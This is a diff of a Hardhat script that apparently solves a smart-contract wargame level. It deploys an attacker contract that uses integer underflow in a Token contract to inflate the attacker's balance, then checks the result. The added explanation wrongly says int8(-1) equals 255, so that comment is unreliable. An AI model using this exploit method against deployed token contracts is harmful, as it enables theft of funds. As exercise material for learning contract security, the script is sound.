@@ -2,23 +2,23 @@ import { Contract } from "ethers";
 import { ethers } from "hardhat";
 import { deployContract } from "../../utils/deployContract";
 import { abi } from "../../artifacts/contracts/5.Token/Token.sol/Token.json";
+import { displayResult } from "../../utils/displayResult";
 
-function setTargetContract() {
-  const contractAddress = "0x95d7B9960500BDe2229D85b896fB6E5bD8578cA2";
-  return new Contract(contractAddress, abi);
-}
+const targetAddress = "0x90f2Ff12f2b64C17cbDD812bF87a1dd412a97FEb";
 
 async function main() {
   const [attacker] = await ethers.getSigners();
-  const TokenAttacker = await deployContract("TokenAttacker", attacker);
-  const TokenTarget = setTargetContract();
-  console.log("Attack starts");
-  const pendingTx = await TokenAttacker.attack();
+  const tokenAttacker = await deployContract("TokenAttacker", attacker, [
+    targetAddress,
+  ]);
+  const tokenTarget = new Contract(targetAddress, abi, attacker);
+  // get tokenTarget max supply
+  const pendingTx = await tokenAttacker.attack();
   await pendingTx.wait();
-  const balance = await TokenTarget.connect(attacker).balanceOf(
-    attacker.address
-  );
-  console.log("Success: ", balance.gt(20));
+  const balance = await tokenTarget
+    .connect(attacker)
+    .balanceOf(attacker.address);
+  displayResult(balance.gt(20));
 }
 
 main().catch((error) => {
@@ -27,6 +27,10 @@ main().catch((error) => {
 });
 
 /* Explanation :
-Here msg.sender is the attacking contract address, tx.origin is the EOA initiating
-the transaction.
+Before Solidity 0.8.0, overflow and underflow did not throw an error. Instead,
+the result was truncated to the size of the type. This is called wrapping.
+For example, uint8(256) is 0, and int8(-1) is 255. 
+This is a common source of bugs, and it is recommended to use SafeMath library 
+to avoid these issues.
+
 */
